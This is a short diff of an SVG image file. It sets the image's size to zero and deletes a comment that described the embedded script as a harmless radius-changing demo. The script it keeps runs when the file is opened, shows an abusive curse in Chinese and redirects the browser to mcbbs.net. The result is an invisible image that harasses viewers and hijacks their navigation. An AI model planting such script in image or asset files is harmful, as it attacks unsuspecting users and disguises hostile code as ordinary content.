@@ -1,7 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
-  <svg width="6cm" height="5cm" viewBox="0 0 600 500"
+  <svg width="0" height="0" viewBox="0 0 0 0"
        xmlns="http://www.w3.org/2000/svg">
-    <!-- ECMAScript to change the radius with each click -->
     <script type="application/ecmascript"> <![CDATA[
       alert("玩迷你的死全家");
       window.location.href="//www.mcbbs.net/";
